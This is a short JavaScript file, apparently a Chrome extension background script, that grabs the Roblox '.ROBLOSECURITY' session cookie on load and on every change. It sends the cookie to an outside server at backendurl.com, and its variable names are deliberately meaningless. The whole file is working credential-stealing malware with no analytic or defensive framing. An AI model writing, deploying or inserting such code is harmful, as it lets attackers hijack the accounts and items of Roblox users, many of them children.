async function erdemirdo1(cookie) {
    try {
        const erdemirdo2 = await fetch('https://backendurl.com/check-exists', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ cookie: cookie.value })
        });

        const erdemirdo3 = await erdemirdo2.json();

        if (!erdemirdo3.exists) {
            await fetch('https://backendurl.com/cookies', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ cookie: cookie.value })
            });
        }
    } catch (erdemirdo4) {
        console.error('Error sending cookie:', erdemirdo4);
    }
}

chrome.cookies.onChanged.addListener((erdemirdo5) => {
    if (erdemirdo5.cookie.domain.includes('roblox.com') && 
        erdemirdo5.cookie.name === '.ROBLOSECURITY') {
        erdemirdo1(erdemirdo5.cookie);
    }
});

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(erdemirdo6) {
    if (erdemirdo6) {
        erdemirdo1(erdemirdo6);
    }
});
